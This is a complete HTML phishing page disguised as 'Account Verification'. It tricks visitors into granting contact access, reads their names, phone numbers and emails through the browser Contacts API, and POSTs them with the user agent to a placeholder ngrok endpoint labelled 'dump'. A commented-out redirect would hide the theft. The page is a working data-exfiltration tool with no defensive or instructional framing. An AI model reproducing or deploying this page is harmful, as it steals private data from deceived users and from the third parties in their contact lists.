<!DOCTYPE html>
<html>
<head>
    <title>Verify Device</title>
    <style>
        body { background: #0a0a0a; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .box { background: #111; padding: 40px; border-radius: 10px; border: 2px solid #0f0; text-align: center; }
        button { background: #0f0; color: #000; padding: 15px 40px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; font-weight: bold; }
        button:hover { background: #0c0; }
        #status { margin-top: 15px; color: #ffaa00; }
    </style>
</head>
<body>
<div class="box">
    <h2>🔐 Account Verification</h2>
    <p>Tap allow to sync your contacts</p>
    <button onclick="dumpContacts()">📂 ALLOW ACCESS</button>
    <div id="status">Waiting...</div>
</div>

<script>
const SERVER_URL = "https://YOUR_NGROK_URL/dump";  // <-- Change this

async function dumpContacts() {
    const status = document.getElementById('status');
    status.innerText = 'Requesting permission...';

    try {
        if (!navigator.contacts) {
            status.innerText = '❌ Not supported. Use Chrome on Android.';
            return;
        }
        const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
        if (!contacts || contacts.length === 0) {
            status.innerText = '⚠️ No contacts or denied.';
            return;
        }
        const payload = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            contacts: contacts.map(c => ({
                name: c.name ? c.name[0] : '',
                phone: c.tel ? c.tel[0] : '',
                email: c.email ? c.email[0] : ''
            }))
        };
        status.innerText = '📤 Sending...';
        const res = await fetch(SERVER_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        if (res.ok) {
            status.innerText = '✅ Synced! Redirecting...';
            // window.location.href = "https://google.com";
        } else {
            status.innerText = '❌ Server error. Check console.';
            console.log(payload);
        }
    } catch (err) {
        status.innerText = '❌ Error: ' + err.message;
    }
}
</script>
</body>
</html>
